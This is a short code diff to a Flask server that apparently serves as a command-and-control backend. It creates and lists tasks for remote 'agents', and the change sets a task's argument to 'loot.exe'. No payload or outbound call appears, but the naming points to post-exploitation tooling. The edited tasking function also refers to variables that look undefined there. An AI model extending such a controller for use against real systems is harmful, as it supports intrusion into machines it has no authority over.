@@ -60,8 +60,7 @@ def create_task():
     db.session.add(task)
     db.session.commit()
     print(f"[+] A new task has been created for {agent_id}")
-    return jsonify({ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":[""] , "status": TASKED,})
-
+    return jsonify({ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":"loot.exe" , "status": TASKED})
 
 @app.route("/tasks/list", methods=["GET"])
 def list_tasks():
@@ -124,13 +123,7 @@ def tasking():
         # have tasked the agent
         task.Status = TASKED
         db.session.commit()
-        t=[{
-            "status": task.Status,
-            "type": task.command_type,
-            "cmd": task.cmd,
-            "job_id": task.job_id,
-            "task_response": task_result
-        }]
+        t = [{ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "status": TASKED}]
         return render_template(
             'outPut.html',
             t=t
